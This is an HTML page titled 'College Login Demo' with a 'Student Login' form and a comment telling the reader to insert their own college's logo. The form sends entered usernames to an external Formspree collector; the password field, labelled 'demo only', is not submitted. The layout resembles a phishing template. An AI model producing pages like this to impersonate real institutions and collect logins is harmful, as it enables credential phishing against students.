<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>College Login Demo</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}

body{
    background:#f5f5f5;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.login-box{
    width:350px;
    background:#fff;
    padding:30px;
    border-radius:10px;
    box-shadow:0 5px 15px rgba(0,0,0,.2);
    text-align:center;
}

.logo{
    width:100px;
    height:100px;
    object-fit:contain;
    margin-bottom:15px;
}

h2{
    margin-bottom:20px;
}

input{
    width:100%;
    padding:12px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:5px;
}

button{
    width:100%;
    padding:12px;
    background:#0066cc;
    color:#fff;
    border:none;
    border-radius:5px;
    cursor:pointer;
}

button:hover{
    background:#004c99;
}
</style>
</head>

<body>

<div class="login-box">

<!-- Replace logo.png with your college logo -->
<img src="logo.png" class="logo" alt="College Logo">

<h2>Student Login</h2>

<form action="https://formspree.io/f/xaqglzoa" method="POST">

<input
type="text"
name="username"
placeholder="Username"
required>

<input
type="password"
placeholder="Password (demo only)"
required>

<button type="submit">Login</button>

</form>

</div>

</body>
</html>
